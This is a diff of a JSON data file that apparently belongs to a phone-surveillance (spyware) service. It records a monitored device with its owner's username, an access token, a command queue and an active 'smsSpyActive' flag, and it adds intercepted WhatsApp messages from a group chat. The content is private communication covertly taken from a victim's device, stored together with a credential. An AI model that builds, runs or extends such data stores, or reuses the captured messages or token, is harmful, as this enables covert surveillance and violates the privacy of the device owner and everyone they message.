@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775927865158,
+    "lastSeen": 1775927890911,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (2 pesan): Menyebut semua",
+        "content": "~ tapzyUrPrblm: 📷 @⁨semua⁩ passin saldo lu ke qr gw tuh nganggur",
+        "time": "12/04 00:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927893108
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
@@ -4115,14 +4123,6 @@
         "time": "11/04 23:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1775924890983
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "‎18 pesan baru",
-        "time": "11/04 23:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924889998
       }
     ],
     "galleryPhotos": [],
